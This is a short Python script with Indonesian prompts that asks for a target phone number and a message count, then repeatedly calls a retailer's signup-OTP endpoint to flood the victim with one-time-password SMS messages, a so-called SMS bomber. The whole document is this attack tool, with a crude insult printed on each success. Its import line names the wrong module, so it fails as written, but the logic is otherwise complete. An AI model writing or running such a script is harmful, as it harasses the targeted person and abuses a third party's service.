import request

no = int(input('masukan nomer target : '))
jum = int(input('masukan jumlah pesan : '))

json = {'phone' :no}
jumlahpesan = 0
for res in range(jum):
	res = requests.post('https://cmsapi.mapclub.com/api/signup-otp',json=json)
	if "ok" in res.text:
		jumlahpesan +=1
		print(jumlahpesan,'done ya anjing')
	else:
		print('maaf ada eror ===>', res.text)
